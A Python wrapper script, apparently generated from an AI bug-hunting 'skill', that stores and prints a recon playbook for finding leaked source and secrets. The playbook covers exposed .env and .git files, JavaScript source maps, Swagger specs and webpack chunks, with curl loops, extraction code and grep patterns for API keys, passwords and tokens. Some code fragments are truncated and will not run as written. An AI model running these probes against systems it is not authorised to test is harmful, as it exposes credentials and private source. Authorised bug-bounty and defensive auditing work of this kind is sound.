#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-source-leak

Skill: HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage
Desc : Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock the entire attack surface.

Run:  python claude-bughunter-hunt-source-leak.py --help
      python claude-bughunter-hunt-source-leak.py --list
      python claude-bughunter-hunt-source-leak.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-source-leak'
TITLE = 'HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage'
DESCRIPTION = 'Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock the entire attack surface.'

PAYLOADS = {
    'main': ["name: hunt-source-leak", "description: Hunt source code and build artifact leakage \u2014 JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session \u2014 these findings often unlock the entire attack surface.", "sources: hackerone_public, offensive_research", "report_count: 31"],
    'hunt-source-leak-source-code-build-artifact-leakage': [],
    'crown-jewel-targets': ["Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.", "**Highest-value findings:**", "- **`.js.map` source maps** \u2014 reconstruct full TypeScript/ES6 source code \u2192 find hardcoded API keys, internal endpoints, auth logic bypasses", "- **`swagger.json` / `openapi.json`** \u2014 complete REST API specification with all endpoints, parameters, auth schemes, and internal route names", "- **`.env` / `.env.production`** \u2014 APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext", "- **`.git/` exposure** \u2014 `git clone` the entire source history \u2192 all past hardcoded secrets", "- **`asset-manifest.json` / `_next/static/`** \u2014 all JS bundle paths \u2192 systematic source map discovery", "- **`build-info` / `info.json`** \u2014 git commit hash, build timestamp, dependency versions \u2192 CVE targeting"],
    'phase-1-quick-wins-run-first': ["```bash"],
    'these-10-requests-take-30-seconds-and-often-yield-critical-findings': ["for PATH in \\", "\"/.env\" \\", "\"/.env.production\" \\", "\"/.env.local\" \\", "\"/.git/HEAD\" \\", "\"/swagger.json\" \\", "\"/api/swagger.json\" \\", "\"/v1/swagger.json\" \\", "\"/openapi.json\" \\", "\"/api/openapi.json\" \\", "\"/api-docs\"; do", "STATUS=$(curl -s -o /tmp/sl_test -w \"%{http_code}\" \"https://$TARGET$PATH\")", "if [ \"$STATUS\" = \"200\" ]; then", "echo \"[+] HIT: https://$TARGET$PATH\"", "head -5 /tmp/sl_test", "echo \"---\""],
    'phase-2-source-map-discovery': ["```bash"],
    'step-1-get-asset-manifest-to-find-all-js-bundle-paths': ["curl -s \"https://$TARGET/asset-manifest.json\" | python3 -m json.tool 2>/dev/null", "curl -s \"https://$TARGET/static/js/main.*.js\" 2>/dev/null | head -3"],
    'next-js': ["BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '\"buildId\":\"\\K[^\"]+')", "curl -s \"https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js\" | head -5"],
    'step-2-for-each-js-bundle-check-for-source-map-reference-at-end-of-file': ["for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src=\"[^\"]*\\.js\"' | sed 's/src=\"//;s/\"//'); do", "LAST_LINE=$(curl -s \"https://$TARGET$JS_URL\" | tail -1)", "echo \"$LAST_LINE\" | grep -q \"sourceMappingURL\" && echo \"[+] Source map: $JS_URL\""],
    'step-3-download-and-reconstruct-source-from-map-files': ["JS_URL=\"https://$TARGET/static/js/main.abc123.js\"", "MAP_URL=\"${JS_URL}.map\"", "curl -s \"$MAP_URL\" | python3 -c \"", "import sys, json, os", "data = json.load(sys.stdin)", "sources = data.get('sources', [])", "contents = data.get('sourcesContent', [])", "for i, (src, content) in enumerate(zip(sources, contents)):", "if content:", "path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')", "os.makedirs(os.path.dirname(path), exist_ok=True)", "with open(path, 'w') as f:", "f.write(content)", "print(f'[+] Extracted: {src}')"],
    'step-4-grep-extracted-source-for-secrets': ["grep -r \"API_KEY\\|SECRET\\|PASSWORD\\|TOKEN\\|PRIVATE\" /tmp/sourcemap_extract/ 2>/dev/null", "grep -r \"process\\.env\\.\" /tmp/sourcemap_extract/ 2>/dev/null | grep -v \"NEXT_PUBLIC_\" | head -20", "grep -r \"http://internal\\|localhost\\|127\\.0\\.0\\.1\\|10\\.\\|172\\.\\|192\\.168\" /tmp/sourcemap_extract/ 2>/dev/null | head -20"],
    'phase-3-swagger-openapi-discovery': ["```bash"],
    'common-paths': ["SWAGGER_PATHS=(", "\"/swagger.json\" \"/swagger.yaml\" \"/swagger/\"", "\"/api/swagger.json\" \"/api/swagger.yaml\"", "\"/v1/swagger.json\" \"/v2/swagger.json\" \"/v3/swagger.json\"", "\"/openapi.json\" \"/openapi.yaml\"", "\"/api/openapi.json\" \"/api-docs\" \"/api-docs.json\"", "\"/api/v1/swagger.json\" \"/api/v2/swagger.json\"", "\"/rest/swagger.json\" \"/rest/api-docs\"", "\"/.well-known/openapi.json\"", "\"/graphql/schema.json\"", "for PATH in \"${SWAGGER_PATHS[@]}\"; do", "STATUS=$(curl -s -o /tmp/swagger_test -w \"%{http_code}\" \"https://$TARGET$PATH\")", "if [ \"$STATUS\" = \"200\" ]; then", "echo \"[+] Found: https://$TARGET$PATH\"", "python3 -c \"", "import sys, json", "d = json.load(open('/tmp/swagger_test'))", "paths = list(d.get('paths', {}).keys())", "print(f'Endpoints: {len(paths)}')", "print('\\n'.join(sorted(paths)))", "except: pass", "\" | head -50"],
    'phase-4-git-exposure': ["```bash"],
    'check-if-git-directory-is-accessible': ["curl -s \"https://$TARGET/.git/HEAD\" | grep -q \"ref:\" && echo \"[+] .git exposed!\""],
    'if-exposed-reconstruct-repo': [],
    'tool-git-dumper': ["pip3 install git-dumper", "git-dumper \"https://$TARGET/.git/\" /tmp/dumped-repo/"],
    'grep-for-secrets-in-all-git-history': ["cd /tmp/dumped-repo && \\", "git log --all --oneline 2>/dev/null | head -20", "git grep -i \"password\\|secret\\|api_key\\|token\" $(git rev-list --all) 2>/dev/null | head -30"],
    'trufflehog-on-git-history': ["trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50"],
    'phase-5-forgotten-files-debug-endpoints': ["```bash"],
    'build-artifacts-and-debug-files': ["DEBUG_PATHS=(", "\"/build-info.json\" \"/build/build-info.json\"", "\"/info\" \"/actuator/info\" \"/api/info\"", "\"/version\" \"/api/version\" \"/_version\"", "\"/health\" \"/status\" \"/ping\"", "\"/robots.txt\" \"/security.txt\" \"/.well-known/security.txt\"", "\"/sitemap.xml\" \"/manifest.json\" \"/browserconfig.xml\"", "\"/crossdomain.xml\" \"/clientaccesspolicy.xml\"", "\"/phpinfo.php\" \"/info.php\" \"/test.php\"", "\"/server-status\" \"/server-info\" \"/.htaccess\"", "\"/web.config\" \"/applicationHost.config\"", "\"/WEB-INF/web.xml\" \"/META-INF/MANIFEST.MF\"", "\"/package.json\" \"/composer.json\" \"/Gemfile\"", "\"/Dockerfile\" \"/docker-compose.yml\" \"/.dockerenv\"", "for PATH in \"${DEBUG_PATHS[@]}\"; do", "STATUS=$(curl -s -o /tmp/debug_test -w \"%{http_code}\" \"https://$TARGET$PATH\")", "if [ \"$STATUS\" = \"200\" ]; then", "echo \"[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)\"", "head -3 /tmp/debug_test", "echo \"---\""],
    'phase-6-ds-store-file-listing': ["```bash"],
    'ds-store-files-on-macos-deployed-web-servers-reveal-directory-structure': ["curl -s \"https://$TARGET/.DS_Store\" | xxd | head -10"],
    'parse-ds-store-to-extract-filenames': ["pip3 install ds_store", "python3 -c \"", "from ds_store import DSStore", "with DSStore.open('/tmp/ds_store_test', 'r') as d:", "for entry in d:", "print(entry.filename)"],
    'recursive-ds-store-enumeration': [],
    'tool-https-github-com-lijiejie-ds-store-exp': ["python3 ds_store_exp.py \"https://$TARGET/\""],
    'phase-7-webpack-chunk-analysis': ["```bash"],
    'download-and-analyze-webpack-chunks-for-hardcoded-values': [],
    'find-chunk-files': ["curl -s https://$TARGET/ | grep -oP '\"[^\"]*\\.chunk\\.js\"' | tr -d '\"' | while read chunk; do", "echo \"Analyzing: $chunk\"", "curl -s \"https://$TARGET$chunk\" | \\", "grep -oE '\"(api_key|apiKey|secret|password|token|key)\"\\s*:\\s*\"[^\"]+\"' | head -5"],
    'also-grep-for-internal-hostnames': ["curl -s \"https://$TARGET/static/js/main.*.js\" | \\", "grep -oE '\"(https?://[^\"]*internal[^\"]*|http://[^\"]*localhost[^\"]*)\"' | sort -u"],
    'check-for-base64-encoded-secrets': ["curl -s \"https://$TARGET/static/js/main.*.js\" | \\", "grep -oP '\"[A-Za-z0-9+/]{30,}={0,2}\"' | while read b64; do", "DECODED=$(echo \"$b64\" | tr -d '\"' | base64 -d 2>/dev/null)", "echo \"$DECODED\" | grep -iE \"key|secret|password|token\" && echo \"  B64: $b64\""],
    'chain-table': [],
    'tools': ["```bash"],
    'git-dumper-reconstruct-exposed-git': ["pip3 install git-dumper", "git-dumper \"https://target.com/.git/\" /tmp/repo/"],
    'sourcemap-explorer-visualize-what-s-in-bundles': ["npm install -g source-map-explorer", "source-map-explorer main.js"],
    'unwebpack-sourcemap-extract-all-source-files': ["npm install -g unwebpack-sourcemap"],
    'trufflehog-secret-scanning': ["trufflehog filesystem /tmp/repo/"],
    'validation': ["\u2705 Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets", "\u2705 Swagger: JSON contains internal endpoints not visible in UI", "\u2705 .git exposed: git-dumper successfully clones repo, secrets in history", "\u2705 .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext", "**Severity:**", "- .env with credentials: Critical", "- .git with secrets in history: Critical", "- Source map with secrets: High", "- Swagger with internal routes: Medium-High", "- robots.txt only: Informational"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()